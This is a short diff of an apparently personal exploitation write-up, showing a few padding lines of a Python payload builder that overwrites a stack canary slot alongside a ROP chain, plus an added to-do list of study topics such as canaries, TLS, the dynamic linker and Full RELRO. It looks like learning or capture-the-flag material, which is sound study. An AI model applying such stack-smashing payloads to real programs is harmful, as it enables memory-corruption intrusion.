@@ -82,10 +82,8 @@ def main():
 
 	
 	payload += 'f'*(0xf0 - len(ROP))
-	#payload += 'a'*(0x7e8 - len(ROP))
 	payload += 'b'* (0x8 * 5)
 	payload += 'c'*0x8 # stack_guard
-	#payload += cyclic(0x800)
 	
 	
 	#gdb.attach(p,script)
@@ -101,4 +99,13 @@ def main():
 if __name__ == '__main__':
 	main()
 ```
+
 update comming soon...
+
+1. Canary(ELF vector)
+2. TLS, TCB
+3. PHP Trick 정리
+4. Compile, make, Linker, etc ..
+5. Dynamic Linker
+6. VDSO
+7. Full RELRO
